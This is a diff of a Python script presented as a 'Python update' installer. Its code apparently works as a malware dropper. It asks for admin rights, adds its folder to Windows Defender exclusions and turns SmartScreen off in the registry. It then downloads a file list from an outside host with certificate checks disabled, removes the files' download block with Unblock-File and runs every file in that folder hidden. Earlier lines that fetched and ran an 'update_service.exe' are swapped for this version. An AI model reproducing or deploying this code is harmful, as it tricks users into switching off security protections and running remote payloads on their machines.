@@ -10,17 +10,15 @@ import ctypes
 import time
 import winreg
 
-is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0
+is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0 #type: ignore
 
 class Main:
 
-    APP_NAME = "update_service"
-    FILE_NAME = "update_service.exe"
-    UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME
+    APP_NAME = "files"
+    FILES_TXT_URL = "http://files.akirottv.de"
 
     BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
     APP_DIR = os.path.join(BASE_DIR, APP_NAME)
-    APP_PATH = os.path.join(APP_DIR, FILE_NAME)
 
     def __init__(self):
         pass
@@ -32,7 +30,7 @@ class Main:
         return install_input.strip().lower() in ['y', '']
 
     def request_admin_privileges(self) -> bool:
-        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) > 32
+        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) > 32 #type: ignore
 
     def add_folder_to_windows_defender_exclusions(self):
         folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
@@ -79,68 +77,85 @@ class Main:
                 time.sleep(2)
         except Exception as e:
             print(f"Registry Fehler: {e}")
-    
-    def download_and_install(self):
-        
-        os.makedirs(self.APP_DIR, exist_ok=True)
+            
+    def download_and_return_list_of_files(self) -> list[str]:
         try:
-            print(f"→ Downloading...")
+            print(f"→ Downloading list of files...")
             context = ssl._create_unverified_context()
-            req = urllib.request.Request(self.UPDATE_URL)
+            req = urllib.request.Request(self.FILES_TXT_URL)
             req.add_header("Pragma", "no-cache")
             with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                 if getattr(resp, "status", 200) != 200:
                     print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
                     exit(1)
                 new_content = resp.read()
-
-            with open(self.APP_PATH, "wb") as f:
-                f.write(new_content)
-
-            print(f"→ Successfully downloaded/updated")
-            subprocess.Popen([self.APP_PATH], shell=True)
+                file_urls = [line.strip() for line in new_content.decode().splitlines() if line.startswith("http")]
+                return file_urls
 
         except Exception as e:
             print(f"{e}")
-            #exit(1)
-            
-    def unblock_file(self, file_path):
-        """
-        Entfernt den Zone.Identifier-Stream von einer Datei, um die SmartScreen-Warnung zu umgehen.
-        """
-        try:
-            # Der versteckte Stream wird als 'Dateipfad:Zone.Identifier' angesprochen
-            stream_path = f"{file_path}:Zone.Identifier"
-            os.remove(stream_path)
-            print(f"Datei '{file_path}' wurde erfolgreich entsperrt.")
-        except FileNotFoundError:
-            print(f"Kein Zone.Identifier-Stream für '{file_path}' gefunden. Die Datei ist möglicherweise bereits entsperrt.")
-        except PermissionError:
-            print(f"Fehler: Keine Berechtigung, um den Stream für '{file_path}' zu entfernen.")
-        except Exception as e:
-            print(f"Ein unerwarteter Fehler ist aufgetreten: {e}")
-
+            exit(1)
+    
+    def download_files(self, file_urls: list[str]):
+        for url in file_urls:
+            try:
+                print(f"→ Downloading {url}...")
+                context = ssl._create_unverified_context()
+                req = urllib.request.Request(url)
+                req.add_header("Pragma", "no-cache")
+                with urllib.request.urlopen(req, timeout=15, context=context) as resp:
+                    if getattr(resp, "status", 200) != 200:
+                        print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
+                        continue
+                    new_content = resp.read()
+                    file_name = os.path.basename(url)
+                    file_path = os.path.join(self.APP_DIR, file_name)
+                    with open(file_path, "wb") as f:
+                        f.write(new_content)
+                    print(f"→ Successfully downloaded {file_name}")
+            except Exception as e:
+                print(f"{e}")
+                continue
+    
+    def unblock_files(self, list_of_files: list[str]):
+        for file_path in list_of_files:
+            try:
+                print(f"→ Unblocking {file_path}...")
+                command = f'powershell -Command "Unblock-File -Path \\"{file_path}\\""'
+                os.system(command)
+            except Exception as e:
+                print(f"{e}")
+    
+    def open_files(self):
+        for file_name in os.listdir(self.APP_DIR):
+            file_path = os.path.join(self.APP_DIR, file_name)
+            if os.path.isfile(file_path):
+                try:
+                    print(f"→ Opening {file_name}...")
+                    subprocess.run(['start', 'cmd', '/c', f'"{file_path}"'], shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW) #type: ignore
+                except Exception as e:
+                    print(f"{e}")
+                    continue
+    
     def disable_smartscreen(self):
         try:
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")
-            winreg.CloseKey(key)
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_SET_VALUE) #type: ignore
+            winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off") #type: ignore
+            winreg.CloseKey(key) #type: ignore
             print("PythonSS erfolgreich aktiviert.")
         except Exception as e:
             print(f"Fehler: {e}")
-
-
 
 if __name__ == "__main__":
     self = Main()
     if is_admin:
         print("Gathering dependencies and preparing for update...")
         self.add_folder_to_windows_defender_exclusions()
-        self.download_and_install()
+        file_urls = self.download_and_return_list_of_files()
         self.disable_smartscreen()
         self.remove_hkey() #234
-        self.unblock_file(self.APP_PATH)
-        self.perform_update()
+        self.unblock_files(file_urls)
+        self.open_files()
         exit(0)
     if self.send_update_notification():
         print("Updating Python...")
@@ -148,7 +163,9 @@ if __name__ == "__main__":
         if self.request_admin_privileges():
             exit(0)
         else:
-            print("Admin privileges are required to perform the update. Please run the installer as an administrator.")
+            print("Admin privileges are required to perform the update. Please rerun the installer as an administrator.")
             time.sleep(2)
+            self.request_admin_privileges()
     else:
         print("Update skipped.")
+        time.sleep(2)
